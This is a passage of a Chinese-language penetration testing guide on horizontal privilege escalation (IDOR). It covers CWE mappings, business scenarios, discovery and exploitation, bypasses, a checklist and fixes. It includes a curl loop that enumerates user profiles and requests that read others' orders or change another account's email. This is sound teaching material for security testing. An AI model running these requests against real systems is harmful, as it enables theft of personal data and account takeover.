# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

水平权限提升是指同一权限级别的用户 A 能够访问或操作用户 B 的数据。这通常是由于缺少资源所有权验证导致的。

**本质问题**：
- 缺少资源所有权检查
- 使用可预测的资源标识符
- 直接暴露内部资源 ID

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-639 | 参数化访问控制不当 |
| CWE-200 | 敏感信息暴露 |
| CWE-284 | 不当访问控制 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户资料 | 查看个人资料 | 修改用户 ID 查看他人资料 |
| 订单系统 | 订单查询 | 遍历订单 ID 查看他人订单 |
| 消息系统 | 查看消息 | 遍历消息 ID 读取他人消息 |
| 文件管理 | 文件下载 | 修改文件 ID 下载他人文件 |
| 支付系统 | 交易记录 | 查看他人交易历史 |

## 2.3 漏洞发现方法

### 2.3.1 资源 ID 遍历

```bash
# 获取自己的资源 ID
GET /api/my/orders
# 返回：[{"id": 1001}, {"id": 1002}]

# 尝试访问相邻 ID
GET /api/orders/1003
GET /api/orders/1004
```

### 2.3.2 所有权验证测试

```bash
# 步骤 1：用自己的账号获取资源
GET /api/users/123/profile

# 步骤 2：用另一个账号访问同一资源
# 如果成功返回数据，则存在漏洞
```

### 2.3.3 批量访问测试

```bash
# 测试批量访问端点
GET /api/users/123,124,125/profile

# 检查是否返回所有用户数据
```

## 2.4 漏洞利用方法

### 2.4.1 用户数据窃取

```bash
# 遍历用户 ID 获取个人资料
for id in {1..1000}; do
    curl -H "Authorization: Bearer $TOKEN" \
        https://target.com/api/users/$id/profile
done
```

### 2.4.2 敏感数据收集

```bash
# 收集订单信息
GET /api/orders/1001
GET /api/orders/1002

# 可能包含：
# - 收货地址
# - 联系电话
# - 支付信息
```

### 2.4.3 未授权操作

```bash
# 尝试修改他人资源
PUT /api/users/123/profile
{
    "email": "attacker@example.com"
}

# 尝试删除他人资源
DELETE /api/users/123/profile
```

## 2.5 漏洞利用绕过方法

### 2.5.1 UUID 预测

```bash
# 如果 UUID 生成算法可预测
# 分析 UUID 模式，尝试相邻值

# UUID v1 包含时间戳，可能可预测
# UUID v4 应该是随机的
```

### 2.5.2 间接引用绕过

```bash

GET /api/users/abc123  # abc123 是用户 ID 的哈希

# 尝试：
# - 解码哈希
# - 遍历可能的输入值
# - 利用哈希碰撞
```

# 第三部分：附录

## 3.1 水平权限测试检查清单

```
□ 测试资源 ID 遍历
□ 测试所有权验证
□ 测试批量访问
□ 测试编码/哈希 ID
□ 测试跨用户操作
□ 测试数据隔离
```

## 3.2 修复建议

1. **实施所有权验证** - 始终验证资源归属
2. **使用不可预测 ID** - 使用随机 UUID
3. **间接对象引用** - 使用会话相关的映射
4. **记录访问日志** - 审计资源访问
